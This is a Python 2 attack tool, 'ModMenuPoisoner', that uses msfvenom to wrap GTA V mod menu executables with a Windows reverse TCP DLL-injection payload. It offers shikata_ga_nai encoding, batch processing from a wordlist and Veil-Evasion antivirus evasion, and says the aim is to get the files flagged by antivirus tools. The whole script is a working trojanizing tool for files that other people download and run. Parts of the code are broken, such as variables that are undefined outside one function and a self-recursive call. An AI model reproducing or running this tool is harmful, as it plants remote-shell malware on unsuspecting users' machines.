#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
import StringIO
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen


os.system('cat /root/ModMenuPoisoner/banner.txt')
wordlist_file = '/root/ModMenuPoisoner/WordlistOfMods.txt'
def poison_mod():
    payload_Generate = 'windows/patchupdllinject/reverse_tcp_uuid'
    LHOST = '8.8.8.8'
    LPORT = '443'
    # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
    bad_Bytes = 'x00'
    payload_Encoder = 'x86/shikata_ga_nai'
    payload_Iterations = '1'
    # output_Format = 'exe'
    output_Format = 'dll'

    output_Dir = '/root/Documents/ModMenusReencoded/'
    input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))

    # Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
    output_Name = os.path.basename(input_Mod_Menu)
    output_File = output_Dir + output_Name

    cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} DLL="{3}" -b '\{4}' -e {5} -i {6} -f {7} -o "{8}" """.format(
        payload_Generate,
        LHOST,
        LPORT,
        input_Mod_Menu,
        bad_Bytes,
        payload_Encoder,
        payload_Iterations,
        output_Format,
        output_File
    )
    print 'Now running command: ' + cmd_String
    os.system(cmd_String)

    print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
    main()



def wordlist_poison():
    os.system('python /root/ModMenuPoisoner/wordlist_poison.py')
    wordlist_poison()
    main()
def open_dir():
    cmd_String = 'nautilus /root/Documents/ModMenusReencoded/'
    os.system(cmd_String)
    main()

def setup():
    os.system('pip install termcolor')
    print '[+] Setup complete'
    return

# def setup():
#     # Git Clone
#     print 'Git cloning newest copy of Poisoner, please wait'
#     os.chdir('/tmp')
#     os.system('git clone https://github.com/tanc7/ModMenuPoisoner')
#
#     # make directories
#     print 'Making required directories'
#     os.system('mkdir /root/Documents/ModMenusReencoded/')
#     # chmod executables
#     os.system('chmod 777 ./*')
#     # copy to new install directory
#     os.system('cp -r ./* /root/ModMenuPoisoner')
#     # Copy to usr/local/bin
#     print 'Adding executable to /usr/local/bin'
#     os.system('cp -r ModMenuPoisoner.py /usr/local/bin')
#
#     output_Dir = '/root/Documents/ModMenusReencoded' # This is the directory for output msfvenom payloads
#     # print setup complete
#     print 'Installing required Python modules'
#     os.system('pip install termcolor')
#     print 'Setup complete'
#     print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
#     print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'

def no_encoder():
    input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))

    # Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
    output_Name = os.path.basename(input_Mod_Menu)
    output_File = output_Dir + output_Name

    cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -f {4} -o {5}".format(
        payload_Generate,
        LHOST,
        LPORT,
        input_Mod_Menu,
        output_Format,
        output_File
    )
    print 'Now running command: ' + cmd_String
    os.system(cmd_String)

    print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
    main()

    return

def multi_no_encoder():
    os.system('python /root/ModMenuPoisoner/multi_no_encoder.py')
    # multi_no_encoder()
    main()
    return

def delete_all_mods():
    main()
    return

def edit_wordlist():
    os.system('leafpad /root/ModMenuPoisoner/WordlistOfMods.txt')
    main()
    return
def main():
    opt_List = [
        '\n\n### REGULAR USAGE ###',
        '#0. Exit the Poisoner Program',
        '#1. SINGLE FILE, Poison a Mod Menu and make it look like a virus to VirusTotal',
        '#2. OPEN ALTERED FILE DIRECTORY, Open the directory where your altered mod menu files are located',
        '#3. MULTIPLE FILES, Poison Mod Menu Executables via a Wordlist full of GTA V Mod Executables',
        '\n\n### CUSTOMIZED USAGE ###',
        '#4. CUSTOM PARAMETERS, Use a completely custom method of payload generation',
        '#5. VEIL-EVASION, Run Veil-Evasion on a executable instead (if msfvenom doesnt work)',
        '\n\n ### NO-ENCODER, if there are encoding errors ###',
        '#6. NO-ENCODER, Run msfvenom WITHOUT encoders (tends to be more successful)',
        '#7. NO-ENCODER (MULTIPLE), Run msfvenom on a wordlist of files',
        '\n\n ### YOUR FIRST TIME ###',
        '#SETUP. Creates the necessary directories and setup',
        '\n\n ### COVERING YOUR TRACKS ###',
        '#8. Delete all mod menu items so you wont get banned from Rockstars Anti-Cheat',
        '#EDIT. Edit the wordlist of multi-mod-menu-poisoner'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        exit(0)
    elif opt_Choice == "1":
        os.system('clear')
        poison_mod()
    elif opt_Choice == "2":
        os.system('clear')
        open_dir()
    elif opt_Choice == "3":
        os.system('clear')
        wordlist_poison()
    elif opt_Choice == "4":
        os.system('clear')
        os.system('python /root/ModMenuPoisoner/CustomPoisoning.py')
    elif opt_Choice == "5":
        os.system('clear')
        os.system('veil-evasion')
        main()
    elif opt_Choice == "6":
        os.system('clear')
        no_encoder()
    elif opt_Choice == "7":
        os.system('clear')
        multi_no_encoder()
    elif opt_Choice == "8":
        os.system('clear')
        delete_all_mods()
    elif opt_Choice == "SETUP":
        os.system('clear')
        setup()
    elif opt_Choice == "EDIT":
        os.system('clear')
        edit_wordlist()
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
